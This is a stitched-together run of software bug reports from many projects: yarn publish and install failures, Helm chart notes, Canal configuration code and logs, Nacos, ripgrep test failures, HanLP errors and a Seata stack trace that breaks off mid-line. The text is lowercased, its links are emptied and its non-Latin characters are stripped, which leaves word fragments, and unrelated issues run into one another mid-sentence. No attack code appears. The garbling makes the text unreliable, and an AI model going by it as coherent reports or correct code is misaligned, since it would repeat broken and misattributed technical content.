right now at the command line, if you type `yarn help <command>` and command does not exist, yarn prints out basic usage of the cli, but it also tells you to visit ` ` even if <command> does not exist
users going to that page will just see a 404 page
**if the current behavior is a bug, please provide the steps to reproduce.**
type, `yarn help not-really-a-command`, goto link thats printed out.
when using yarn publish and aborting after entering a version number, the version number is not reset
as a consequence it seems impossible to publish the same version number "again" without reverting the change manually.
**if the current behavior is a bug, please provide the steps to reproduce.** ```
[tkloht@tobias-air ~/code/react-component-scripts:master] yarn publish
yarn publish v0.15.1
[1/4] bumping version...
info current version: 1.4.1
question new version: 1.4.2
info new version: 1.4.2
[2/4] logging in...
info npm username: tkloht
info npm username: tobias.kloht@gmail.com
error canceled at interface.<anonymous> (/users/tkloht/.nvm/versions/node/v6.2.1/lib/node_modules/yarnpkg/node_modules/read/lib/read.js:66:13) at emitnone (events.js:86:13) at interface.emit (events.js:185:7) at interface._ttywrite (readline.js:707:16) at readstream.onkeypress (readline.js:115:10) at emittwo (events.js:106:13) at readstream.emit (events.js:191:7) at emitkeys (internal/readline.js:385:14) at next (native) at readstream.ondata (readline.js:939:36)
info visit for documentation about this command.
``` after this the version number is already changed: ```
diff --git a/package.json b/package.json
index e8764fc..c6d0fb4 100644
--- a/package.json
+++ b/package.json
@@ -1,6 +1,6 @@ { "name": "@tkloht/react-component-scripts",
- "version": "1.4.1",
+ "version": "1.4.2",
``` this makes it impossible to publish version 1.4.2 in this example: ```
[tkloht@tobias-air ~/code/react-component-scripts:master*] yarn publish
yarn publish v0.15.1
[1/4] bumping version...
info current version: 1.4.2
question new version: 1.4.2
error new version is the same as the current version.
info visit for documentation about this command.
rokas@rokas ~/dev/verse
$ yarn add @types/react -dev
yarn add v0.15.1
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
success saved 1 new dependency
@types/react@0.14.39
done in 0.89s
# at this point node_modules has @types/react rokas@rokas ~/dev/verse
$ yarn add @types/react-dom -dev
yarn add v0.15.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
error enoent: no such file or directory, open 'c:\\users\ okas\\dev\\verse\ ode_modules\\@types\ eact-dom\\index.d.ts' at error (native)
info visit for documentation about this command
# at this point node_modules is empty $ yarn add @types/react-dom @types/react -dev
yarn add v0.15.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
success saved 2 new dependencies.
@types/react-dom@0.14.17
@types/react@0.14.39
done in 2.25s
# at this point it has both of them rokas@maziai ~/dev/verse
$ yarn add react react-dom
yarn add v0.15.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
error enoent: no such file or directory, open 'c:\\users\ okas\\dev\\verse\ ode_modules\\@types\ eact\\index.d.ts' at error (native)
info visit for documentation about this command
# at this point @types is gone, it has react/react-dom and their dependencies, however none has package.json
``` **if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn add @types/react @types/react-dom -dev
yarn add react react-dom
when running `yarn` in a folder with **if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn init # yes to all
vim package.json # replace "license": "mit" with "license": ""
% yarn yarn install v0.15.1
info no lockfile found.
error typeerror: test@1.0.0: cannot read property 'touppercase' of undefined at array.<anonymous> (/home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/node_modules/spdx-correct/index.js:82:23) at validtransformation (/home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/node_modules/spdx-correct/index.js:173:36) at module.exports (/home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/node_modules/spdx-correct/index.js:215:21) at module.exports (/home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/node_modules/validate-npm-package-license/index.js:60:23) at isvalidlicense (/home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/lib/util/normalize-manifest/util.js:16:10) at exports.default (/home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/lib/util/normalize-manifest/validate.js:53:55) at /home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/lib/util/normalize-manifest/index.js:56:51 at next (native) at step (/home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /home/espen/.nvm/versions/node/v6.6.0/lib/node_modules/yarnpkg/node_modules/babel-runtime/helpers/asynctogenerator.js:28:20
info visit for documentation about this command.
after install, i am seeing errors 'chokidar' is not installed
it seems to be included in `babel-cli`, `watchpack`, etc modules but it is not in `node_modules`
however, i can `chokidar` in `yarn.lock`
this makes me enable to do `webpack --watch`
**if the current behavior is a bug, please provide the steps to reproduce.** ``` json
{ "name": "yarnjs-bug-missing-deps", "description": "", "version": "1.0.0", "author": "jaeho lee <jaeho@dev.fancy.com>", "licenses": "proprietary", "scripts": { "postinstall": "" }, "devdependencies": { "babel-cli": "^6.16.0", "babel-core": "^6.4.5", "webpack": "^1.12.12" }
``` use this package.json to `yarn` and see `chokidar` is missing in node_modules
when running `yarn` optional dependencies of packages are not met
**if the current behavior is a bug, please provide the steps to reproduce.**
run a package with `optionaldependencies` declared
removes everything from `bower_components` directory **if the current behavior is a bug, please provide the steps to reproduce.**
in a project, that uses both npm and bower, run `yarn`
yarn install v0.15.1
error syntaxerror: unknown token 1:0 at parser.unexpected (/app/node/lib/node_modules/yarnpkg/lib/lockfile/parse.js:218:11) at parser.parse (/app/node/lib/node_modules/yarnpkg/lib/lockfile/parse.js:323:14) at exports.default (/app/node/lib/node_modules/yarnpkg/lib/lockfile/parse.js:13:17) at /app/node/lib/node_modules/yarnpkg/lib/registries/yarn-registry.js:105:62 at next (native) at step (/app/node/lib/node_modules/yarnpkg/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /app/node/lib/node_modules/yarnpkg/node_modules/babel-runtime/helpers/asynctogenerator.js:28:20
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
just run `yarn`
$ yarn install --pure-lockfile
$ yarn check --integrity
yarn check v0.14.0
error integrity hashes don't match, expected 1fda2993d6dabf526ed1d4f7faa4af7bb8408efedfa1a0c7deced8768f3c242a but got a663cd3ec745d0ad9edb32199d0b5680951bfb5d47af77bca25e9bc7f9290622
``` yarn `check --integrity` calculates hash based on in memory representation of yarn.lock file instead of the actual file.
this makes `yarn install --pure-lockfile` less useful.
peerdependencies are unexpectedly duplicated during installation
**if the current behavior is a bug, please provide the steps to reproduce.** given package.json: ```
{ "name": "peer-deps-test", "version": "1.0.0", "devdependencies": { "webpack": "beta" }
``` do `yarn install` to install the dependencies
then add a webpack plugin that has a `peerdependencies` field containing `webpack`, e.g
`html-webpack-plugin` ```
yarn add html-webpack-plugin --dev
``` the plugin is installed, but so is another copy of webpack: ```
$ ls node_modules/html-webpack-plugin/node_modules/
cliui crypto-browserify https-browserify isarray os-browserify ripemd160 stream-browserify uglify-js watchpack window-size yargs
constants-browserify enhanced-resolve interpret node-libs-browser readable-stream sha.js tapable url webpack wordwrap
many packages do this for some reason (i'm assuming legacy npm): ``` js
engines: [ 'node >=0.8.0' ]
``` these cause lots of warnings in yarn: ```
warning temp@0.8.3: the engine "0" appears to be invalid.
warning concat-stream@1.4.10: the engine "0" appears to be invalid.
warning concat-stream@1.5.2: the engine "0" appears to be invalid.
warning watch@0.10.0: the engine "0" appears to be invalid.
warning jsonparse@1.2.0: the engine "0" appears to be invalid.
warning jsprim@1.3.1: the engine "0" appears to be invalid.
warning extsprintf@1.0.2: the engine "0" appears to be invalid.
warning verror@1.3.6: the engine "0" appears to be invalid.
if you bump the version of a package in the publish flow it but then enter the wrong password it will leave the version bump in place leaving you to manually revert it
when a file contains a dependency with invalid semver that can't be cleaned, the invalid semver is retained, causing an invalid pattern that fails to be flattened during collapseallversionsofpackage
for example, when something has a dependency with version `"2"`
see below for example repo
**if the current behavior is a bug, please provide the steps to reproduce.**
discovered while fixing #423
with the fix located on you can reproduce this when trying to `yarn install` [this repo](
make sure you're on [this branch of my fork](
clone
cd into the repo
yarn install
note the manifest exception (it looks identical to the issue in #423, but if you try the original package ([pretty-format]( you'll notice that it should pass with no errors.
running `yarn install --flat` ends with an invariant violation (expected manifest)
it does let me resolve everything and adds them to the `package.json` so running a normal `yarn install` works after that
after a quick investigation it comes down to the `packageresolver` not having patterns for flattened packages
i suspect this is a result of `install` having the actual flatten logic and `packageresolver` not understanding that.
unable to download kubectl from internet
getting error error: yaml parse error on sonarqube/templates/config.yaml: error converting yaml to json: yaml: line 12: did not find expected key
: telegraf chart says it was deprecated (by #823) , suggests using `telegraf-ds` and `telegraf-s`, these two charts were added in march (#742, #822) but never get merged.
: the google test-infra team's jenkins is going away in favor of prow which has less maintenance and runs / tests on kubernetes natively this repo is one of the last places jenkins-based presubmits still run for.
lobal efault-instance.xml nstance roup ysql ### debug 1
anal.admin.manager nstanceconfig.setmode(instancemode.manager)
ode == instancemode.manager xample.spring.xml ```java
// com.alibaba.otter.canal.deployer.canalcontroller private void initinstanceconfig(properties properties) { // dmin anal.properties string destinationstr = getproperty(properties, canalconstants.canal_destinations); string[] destinations = stringutils.split(destinationstr, canalconstants.canal_destination_split); for (string destination : destinations) { instanceconfig config = parseinstanceconfig(properties, destination); instanceconfig oldconfig = instanceconfigs.put(destination, config); if (oldconfig != null) { logger.warn("destination:{} old config:{} has replace by new config:{}", destination, oldconfig, config); } } } private instanceconfig parseinstanceconfig(properties properties, string destination) { string adminmanageraddress = getproperty(properties, canalconstants.canal_admin_manager); instanceconfig config = new instanceconfig(globalinstanceconfig); string modestr = getproperty(properties, canalconstants.getinstancemodekey(destination)); // anal admin ode anager if (stringutils.isnotempty(adminmanageraddress)) { // anager , anager config.setmode(instancemode.manager); } else if (stringutils.isnotempty(modestr)) { config.setmode(instancemode.valueof(stringutils.uppercase(modestr))); } string lazystr = getproperty(properties, canalconstants.getinstanclazykey(destination)); if (!stringutils.isempty(lazystr)) { config.setlazy(boolean.valueof(lazystr)); } if (config.getmode().ismanager()) { string manageraddress = getproperty(properties, canalconstants.getinstancemanageraddresskey(destination)); if (stringutils.isnotempty(manageraddress)) { if (stringutils.equals(manageraddress, "${canal.admin.manager}")) { manageraddress = adminmanageraddress; } config.setmanageraddress(manageraddress); } // anager, pring.xml lobal.spring.xml } else if (config.getmode().isspring()) { string springxml = getproperty(properties, canalconstants.getinstancspringxmlkey(destination)); if (stringutils.isnotempty(springxml)) { config.setspringxml(springxml); } } return config; }
``` ### log ```log
2020-05-21 09:58:45.341 [pool-50-thread-1] info c.a.o.c.i.spring.support.propertyplaceholderconfigurer - loading properties file from class path resource [canal.properties]
2020-05-21 09:58:45.341 [pool-50-thread-1] info c.a.o.c.i.spring.support.propertyplaceholderconfigurer - loading properties file from class path resource [shop-item/instance.properties]
2020-05-21 09:58:45.341 [pool-50-thread-1] warn c.a.o.c.i.spring.support.propertyplaceholderconfigurer - could not load properties from class path resource [shop-item/instance.properties]: class path resource [shop-item/instance.properties] cannot be opened because it does not exist
2020-05-21 09:58:45.345 [pool-50-thread-1] info c.a.otter.canal.instance.spring.canalinstancewithspring - start cannalinstance for 1-shop-item 2020-05-21 09:58:45.349 [pool-50-thread-1] warn c.a.o.canal.parse.inbound.mysql.dbsync.logeventconvert - --> init table filter : ^.*\\..*$
2020-05-21 09:58:45.349 [pool-50-thread-1] warn c.a.o.canal.parse.inbound.mysql.dbsync.logeventconvert - --> init table black filter : 2020-05-21 09:58:45.349 [destination = shop-item , address = null , eventparser] error c.a.o.c.p.inbound.mysql.rds.rdsbinlogeventparserproxy - parse events has an error
com.alibaba.otter.canal.parse.exception.canalparseexception: illegal connection is null
2020-05-12 21:29:58.779 [thread-2] error c.z.a.datastash.launcher.client.loader.adapterprocessor - process error!
com.rabbitmq.client.alreadyclosedexception: connection is already closed due to clean connection shutdown; protocol method: #method<connection.close>(reply-code=200, reply-text=ok, class-id=0, method-id=0) at com.rabbitmq.client.impl.amqchannel.processshutdownsignal(amqchannel.java:401) ~[amqp-client-5.9.0.jar:5.9.0] at com.rabbitmq.client.impl.channeln.startprocessshutdownsignal(channeln.java:287) ~[amqp-client-5.9.0.jar:5.9.0] at com.rabbitmq.client.impl.channeln.close(channeln.java:608) ~[amqp-client-5.9.0.jar:5.9.0] at com.rabbitmq.client.impl.channeln.close(channeln.java:542) ~[amqp-client-5.9.0.jar:5.9.0] at com.rabbitmq.client.impl.channeln.close(channeln.java:535) ~[amqp-client-5.9.0.jar:5.9.0] at com.rabbitmq.client.impl.recovery.autorecoveringchannel.close(autorecoveringchannel.java:73) ~[amqp-client-5.9.0.jar:5.9.0] at com.zmops.argus.datastash.connector.consumer.canalrabbitmqconsumer.disconnect(canalrabbitmqconsumer.java:194) ~[argus-datastash-0.0.1-snapshot.jar:na] at com.zmops.argus.datastash.launcher.client.loader.adapterprocessor.process(adapterprocessor.java:221) ~[argus-datastash-0.0.1-snapshot.jar:na] at java.lang.thread.run(thread.java:748) ~[na:1.8.0_242]
endless retrying in local binlog mode none
``` ``` ![image](
{"data":[{"name":"1","value":"a","id":"aaa"}],"database":"hello","es":1553330817000,"id":20,"isddl":false,"mysqltype":{"name":"varchar(255)","value":"varchar(255)","id":"int"},"old":null,"pknames":["id"],"sql":"","sqltype":{"name":4,"value":12,"id":12},"table":"quniya4","ts":1553330817903,"type":"insert"}
``` hbase
hbase(main):009:0> scan 'hello.quniya4'
row column+cell ccc|3 column=cf:id, timestamp=1553331439400, value=ccc ccc|3 column=cf:name, timestamp=1553331439400, value=3 ccc|3 column=cf:value, timestamp=1553331439400, value=c
see this issue
modify configuration file port service port modified successfully
only can support ip for now.
new instance can't registed on the nacos regist center
return garbled text.
// remove old format file: if (stringutils.isnoneblank(namespaceid)) { if (datum.key.contains(constants.default_group + constants.service_info_spliter)) { string olddatumkey = datum.key .replace(constants.default_group + constants.service_info_spliter, stringutils.empty); cachefile = cachefile(cachefilename(namespaceid, datum.key)); if (cachefile.exists() && !cachefile.delete()) { loggers.raft.error("[raft-delete] failed to delete old format datum: {}, value: {}", datum.key, datum.value); throw new illegalstateexception("failed to delete old format datum: " + datum.key); } } }
repeat input
log in with the wrong username or password, jackson serialization login response failed
revert chunk isn't work.
iscovery ublic 03
$ rg -pz foo /usr/share/doc error: the argument '--pretty' was provided more than once, but cannot be used multiple times usage: rg [options] pattern [path ...] rg [options] [-e pattern ...] [-f patternfile ...] [path ...] rg [options] --files [path ...] rg [options] --type-list command | rg [options] pattern for more information try --help
test misc::compressed_uncompress ..
failed failures: ---- misc::compressed_uncompress stdout ----
thread 'misc::compressed_uncompress' panicked at ' ==========
command failed but expected success! did your search end up with no results? command: "/var/tmp/portage/sys-apps/ripgrep-12.1.0/work/ripgrep-12.1.0/target/release/deps/../rg" "--path-separator" "/" "-z" "sherlock" "sherlock.z" cwd: /var/tmp/portage/sys-apps/ripgrep-12.1.0/temp/ripgrep-tests/compressed_uncompress/108 dir list: ["/var/tmp/portage/sys-apps/ripgrep-12.1.0/temp/ripgrep-tests/compressed_uncompress/108", "/var/tmp/portage/sys-apps/ripgrep-12.1.0/temp/ripgrep-tests/compressed_uncompress/108/sherlock.z"] status: exit code: 1 stdout: stderr: ==========
', tests/util.rs:406:13
stack backtrace: 0: - <std::sys_common::backtrace::_print::displaybacktrace as core::fmt::display>::fmt::h1e21cbf03e4e5763 1: - core::fmt::write::hb3ff83338e8b2d66 2: - std::io::write::write_fmt::h5fd38946bf8c7a11 3: - std::io::impls::<impl std::io::write for alloc::boxed::box<w>>::write_fmt::h0e0d8e73cfc9ac67 4: - std::panicking::default_hook::{{closure}}::ha159ab335d6d2780 5: - std::panicking::default_hook::hc6f8b73d36ecf078 6: - std::panicking::rust_panic_with_hook::h2b8f1d2ef0497000 7: - rust_begin_unwind 8: - std::panicking::begin_panic_fmt::h4ffe547a81dbf942 9: - integration::util::testcommand::expect_success::h742640728124be65 10: - integration::util::testcommand::stdout::h9c875b01ea94d149 11: - integration::misc::compressed_uncompress::h040d70216738de96 12: - test::__rust_begin_short_backtrace::h5d4bbc96f3e45b05 13: - <alloc::boxed::box<f> as core::ops::function::fnonce<a>>::call_once::he06369dcdc359518 14: - __rust_try 15: - __rust_maybe_catch_panic 16: - test::run_test_in_process::hab58b4da0b1dab28 17: - std::sys_common::backtrace::__rust_begin_short_backtrace::h71a54a46a35eda28 18: - std::panicking::try::do_call::h3448860c56f573f7 19: - __rust_try 20: - __rust_maybe_catch_panic 21: - core::ops::function::fnonce::call_once{{vtable.shim}}::h513d035f57eb50fe 22: - <alloc::boxed::box<f> as core::ops::function::fnonce<a>>::call_once::hefcd91f4e78e44b5 23: - std::sys_common::thread::start_thread::hf3c0bc78acf4ce1e 24: - std::sys::unix::thread::thread::new::thread_start::he003e4e14f3e450a 25: - start_thread at /var/tmp/portage/sys-libs/glibc-2.31-r3/work/glibc-2.31/nptl/pthread_create.c:477 26: - __clone failures: misc::compressed_uncompress test result: failed
254 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out
the output is `0` whereas the output for the same command with `--count` instead of `--count-matches` is `2`.
no `.zip` or `.tar.gz` are searched
#### if this is a bug, what is the expected behavior? should search in `.zip` and `.tar.gz` files.
lbert
ypeerror: apply_gradients() got an unexpected keyword argument 'experimental_aggregate_gradients'
ead
- ickle,
- ipeline result ict
- ickle semantic parser result
- esult emantic parser ump
- emantic parser esult ict
ataset nputids `generator` yielded an element that did not match the expected structure
anlp/common/transform.py amples = self.inputs_to_samples(inputs, gold) nputs_to_samples onvert_examples_to_features
ip install hanlp
`hanlp.pretrained.dep.ctb7_biaffine_dep_zh`
teration `word += c` ssue og
enableprobability
json ** **
{ "sentences": [], "tokens": [], "part_of_speech_tags": [], "named_entities": [], "syntactic_dependencies": [], "semantic_dependencies": [], "s": [ "hanlp ", "hanlp ", " " ],
"syntactic_dependencies": [ [{"id": 1, "form": " ", "cpos": "nn", "pos": null, "head": 2, "deprel": "nn", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 2, "form": " ", "cpos": "nn", "pos": null, "head": 18, "deprel": "nsubj", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 3, "form": " ", "cpos": "p", "pos": null, "head": 18, "deprel": "prep", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 4, "form": " ", "cpos": "nn", "pos": null, "head": 6, "deprel": "conj", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 5, "form": " ", "cpos": "cc", "pos": null, "head": 6, "deprel": "cc", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 6, "form": " ", "cpos": "nn", "pos": null, "head": 7, "deprel": "nn", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 7, "form": " ", "cpos": "nn", "pos": null, "head": 3, "deprel": "pobj", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 8, "form": " ", "cpos": "pu", "pos": null, "head": 18, "deprel": "punct", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 9, "form": " ", "cpos": "nn", "pos": null, "head": 10, "deprel": "nn", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 10, "form": " ", "cpos": "nn", "pos": null, "head": 14, "deprel": "nsubj", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 11, "form": " ", "cpos": "pu", "pos": null, "head": 14, "deprel": "punct", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 12, "form": " ", "cpos": "nn", "pos": null, "head": 13, "deprel": "nn", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 13, "form": " ", "cpos": "nn", "pos": null, "head": 14, "deprel": "nsubj", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 14, "form": " ", "cpos": "vv", "pos": null, "head": 18, "deprel": "dep", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 15, "form": " ", "cpos": "nn", "pos": null, "head": 14, "deprel": "dobj", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 16, "form": " ", "cpos": "pu", "pos": null, "head": 14, "deprel": "punct", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 17, "form": " ", "cpos": "ad", "pos": null, "head": 18, "deprel": "advmod", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 18, "form": " ", "cpos": "vv", "pos": null, "head": 0, "deprel": "root", "lemma": null, "feats": null, "phead": null, "pdeprel": null}, {"id": 19, "form": " ", "cpos": "pu", "pos": null, "head": 18, "deprel": "punct", "lemma": null, "feats": null, "phead": null, "pdeprel": null}] ],
json.dump
ctb5_pos_rnn
downloading ** #bpnn/data/embed.txt** to /root/.hanlp/thirdparty/github.com/suda-la/cip/archive/master.zip
**100.00%, 4 kb/4 kb, 14.1 mb/s, eta 0 s** ......
**filenotfounderror**: [errno 2] no such file or directory: '/root/.hanlp/thirdparty/github.com/suda-la/cip/archive/master/bpnn/data/embed.txt'
when i run the said code, i get the follwoing error and point to this file "component_util.py"
nameerror: name 'exit' is not defined on line 56
================ ==============
exception in thread "main" java.lang.nullpointerexception at com.hankcs.hanlp.mining.cluster.clusteranalyzer.refine_clusters(clusteranalyzer.java:263) at com.hankcs.hanlp.mining.cluster.clusteranalyzer.kmeans(clusteranalyzer.java:147)
repeatedbisection:
================ ============== exception in thread "main" java.lang.nullpointerexception at com.hankcs.hanlp.mining.cluster.clusteranalyzer.repeatedbisection(clusteranalyzer.java:222) at com.hankcs.hanlp.mining.cluster.clusteranalyzer.repeatedbisection(clusteranalyzer.java:180)
modulenotfounderror: no module named 'regex'
downloading to /users/wuhaixu/.hanlp/dep/biaffine_ctb7_20191229_130325.zip
100.00%, 65.8 mb/65.8 mb, 219 kb/s, eta 0 s extracting /users/wuhaixu/.hanlp/dep/biaffine_ctb7_20191229_130325.zip to /users/wuhaixu/.hanlp/dep
downloading #bpnn/data/embed.txt to /users/wuhaixu/.hanlp/thirdparty/github.com/suda-la/cip/archive/master.zip
100.00%, 0 kb/0 kb, 0 kb/s, eta 0 s extracting /users/wuhaixu/.hanlp/thirdparty/github.com/suda-la/cip/archive/master.zip to /users/wuhaixu/.hanlp/thirdparty/github.com/suda-la/cip/archive
failed to load
see stack trace below
traceback (most recent call last): file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/hanlp/utils/component_util.py", line 36, in load_from_meta_file obj.load(save_dir) file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/hanlp/common/component.py", line 231, in load self.build(**merge_dict(self.config, training=false, logger=logger, **kwargs, overwrite=true, inplace=true)) file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/hanlp/common/component.py", line 242, in build loss=kwargs.get(\'loss\', none))) file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/hanlp/components/parsers/biaffine_parser.py", line 35, in build_model self.transform) if pretrained_embed else none file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/hanlp/layers/embeddings/__init__.py", line 33, in build_embedding layer: tf.keras.layers.embedding = tf.keras.utils.deserialize_keras_object(embeddings) file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/tensorflow_core/python/keras/utils/generic_utils.py", line 305, in deserialize_keras_object return cls.from_config(cls_config) file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/tensorflow_core/python/keras/engine/base_layer.py", line 519, in from_config return cls(**config) file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/hanlp/layers/embeddings/word2vec.py", line 119, in __init__ word2vec, _output_dim = load_word2vec(filepath) file "/users/wuhaixu/anaconda3/lib/python3.6/site-packages/hanlp/utils/io_util.py", line 410, in load_word2vec with open(realpath, encoding=\'utf-8\', errors=\'ignore\') as f:
filenotfounderror: [errno 2] no such file or directory: '/users/wuhaixu/.hanlp/thirdparty/github.com/suda-la/cip/archive/master/bpnn/data/embed.txt'
was created with hanlp-2.0.0, but you are running 2.0.0-alpha.12
try to upgrade hanlp with
pip install --upgrade hanlp
caused by: org.springframework.beans.factory.beancreationexception: error creating bean with name 'scopedtarget.batchmultisendpartitioner': scope 'step' is not active for the current thread; consider defining a scoped proxy for this bean if you intend to refer to it from a singleton; nested exception is java.lang.illegalstateexception: no context holder available for step scope at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:355) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:197) at org.springframework.aop.target.simplebeantargetsource.gettarget(simplebeantargetsource.java:35) at io.seata.spring.util.springproxyutils.findtargetclass(springproxyutils.java:57) at io.seata.spring.annotation.globaltransactionscanner.wrapifnecessary(globaltransactionscanner.java:210) ..
78 common frames omitted
seata harding jdbc failed to fetch schema of trend_chart rend_chart
io.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache#resultsetmetatoschema
col.setcharoctetlength(rscolumns.getint("char_octet_length")); tring nteger ```
2020-06-17 16:20:29.455 error 15280 --- [nio-2566-exec-1] i.s.r.d.s.s.c.abstracttablemetacache : get cache error:failed to fetch schema of trend_chart java.sql.sqlexception: failed to fetch schema of trend_chart at io.seata.rm.datasource.sql.struct.cache.postgresqltablemetacache.fetchschema(postgresqltablemetacache.java:77) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.sql.struct.cache.abstracttablemetacache.lambda$gettablemeta$0(abstracttablemetacache.java:61) ~[seata-all-1.2.0.jar:1.2.0] at com.github.benmanes.caffeine.cache.boundedlocalcache.lambda$docomputeifabsent$14(boundedlocalcache.java:2379) ~[caffeine-2.8.0.jar:na] at java.util.concurrent.concurrenthashmap.compute(concurrenthashmap.java:1853) ~[na:1.8.0_251] at com.github.benmanes.caffeine.cache.boundedlocalcache.docomputeifabsent(boundedlocalcache.java:2377) ~[caffeine-2.8.0.jar:na] at com.github.benmanes.caffeine.cache.boundedlocalcache.computeifabsent(boundedlocalcache.java:2360) ~[caffeine-2.8.0.jar:na] at com.github.benmanes.caffeine.cache.localcache.computeifabsent(localcache.java:108) ~[caffeine-2.8.0.jar:na] at com.github.benmanes.caffeine.cache.localmanualcache.get(localmanualcache.java:62) ~[caffeine-2.8.0.jar:na] at io.seata.rm.datasource.sql.struct.cache.abstracttablemetacache.gettablemeta(abstracttablemetacache.java:59) ~[seata-all-1.2.0.jar:1.2.0] at io.seata.rm.datasource.abstractconnectionproxy.preparestatement(abstractconnectionproxy.java:117) ~[seata-all-1.2.0.jar:1.2.0] at org.apache.ibatis.executor.statement.preparedstatementhandler.instantiatestatement(preparedstatementhandler.java:86) ~[mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.executor.statement.basestatementhandler.prepare(basestatementhandler.java:88) ~[mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.executor.statement.routingstatementhandler.prepare(routingstatementhandler.java:59) ~[mybatis-3.5.4.jar:3.5.4] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.apache.ibatis.plugin.invocation.proceed(invocation.java:49) ~[mybatis-3.5.4.jar:3.5.4] at com.baomidou.mybatisplus.extension.plugins.paginationinterceptor.intercept(paginationinterceptor.java:174) ~[mybatis-plus-extension-3.3.2.jar:3.3.2] at org.apache.ibatis.plugin.plugin.invoke(plugin.java:61) ~[mybatis-3.5.4.jar:3.5.4] at com.sun.proxy.$proxy222.prepare(unknown source) ~[na:na] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.preparestatement(mybatissimpleexecutor.java:92) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.doupdate(mybatissimpleexecutor.java:53) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) ~[mybatis-3.5.4.jar:3.5.4] at com.baomidou.mybatisplus.core.executor.mybatiscachingexecutor.update(mybatiscachingexecutor.java:83) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:197) ~[mybatis-3.5.4.jar:3.5.4] at org.apache.ibatis.session.defaults.defaultsqlsession.insert(defaultsqlsession.java:184) ~[mybatis-3.5.4.jar:3.5.4] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_251] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_251] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_251] at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:426) ~[mybatis-spring-2.0.4.jar:2.0.4] at com.sun.proxy.$proxy131.insert(unknown source) ~[na:na] at org.mybatis.spring.sqlsessiontemplate.insert(sqlsessiontemplate.java:271) ~[mybatis-spring-2.0.4.jar:2.0.4] at com.baomidou.mybatisplus.core.override.mybatismappermethod.execute(mybatismappermethod.java:60) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at com.baomidou.mybatisplus.core.override.mybatismapperproxy.invoke(mybatismapperproxy.java:96) ~[mybatis-plus-core-3.3.2.jar:3.3.2] at com.sun.proxy.$proxy167.insert(unknown source) ~[na:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_251] at 